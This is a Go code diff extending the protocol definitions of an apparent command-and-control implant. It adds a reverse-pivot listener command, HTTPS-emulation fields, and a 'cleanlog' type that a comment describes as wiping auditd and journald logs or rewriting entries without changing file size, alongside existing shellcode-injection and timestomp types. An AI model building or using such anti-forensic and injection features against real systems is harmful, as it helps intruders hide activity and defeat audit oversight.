@@ -31,6 +31,9 @@ type Profile struct {
 	UaCount           int      `msgpack:"ua_count,omitempty"`
 	AnsSize           int      `msgpack:"ans_size,omitempty"`
 	AnsPreSize        int      `msgpack:"ans_pre_size,omitempty"`
+	// HTTPS-emulation fields (H1 Phase 1b)
+	IsHttpsEmu        bool     `msgpack:"is_https_emu,omitempty"`
+	HeartbeatHeader   string   `msgpack:"heartbeat_header,omitempty"`
 }
 
 type SessionInfo struct {
@@ -106,6 +109,7 @@ type AnsDownload struct {
 }
 
 type ParamsUpload struct {
+	Task    string `msgpack:"task"`
 	Path    string `msgpack:"path"`
 	Content []byte `msgpack:"content"`
 	Finish  bool   `msgpack:"finish"`
@@ -297,6 +301,13 @@ type ParamsTimestomp struct {
 	Timestamp uint64 `msgpack:"timestamp"`
 }
 
+// P2-E cleanlog：path+pairs 都空 = 默认安全清理（auditd 判定 + journald 轮转清归档）；
+// 给了 path+pairs = 等长就地改写（文件大小零变化）。
+type ParamsCleanlog struct {
+	Path  string `msgpack:"path"`
+	Pairs string `msgpack:"pairs"`
+}
+
 type ParamsInject struct {
 	Pid       int    `msgpack:"pid"`
 	Shellcode []byte `msgpack:"shellcode"`
@@ -306,6 +317,12 @@ type ParamsInject struct {
 type ParamsLink struct {
 	Address string `msgpack:"address"`
 	Port    int    `msgpack:"port"`
+}
+
+// ParamsPivotListen — reverse pivot: the agent listens, children dial in.
+// Port == 0 asks the agent to stop listening.
+type ParamsPivotListen struct {
+	Port int `msgpack:"port"`
 }
 
 type AnsLink struct {
@@ -390,6 +407,9 @@ const (
 	COMMAND_PIVOT_EXEC = 39
 	COMMAND_LINK       = 40
 	COMMAND_UNLINK     = 41
+	// Reverse pivot: parent agent listens, child agent dials in.
+	// port == 0 asks the agent to stop listening.
+	COMMAND_PIVOT_LISTEN = 46
 
 	COMMAND_TUNNEL_START  = 31
 	COMMAND_TUNNEL_STOP   = 32
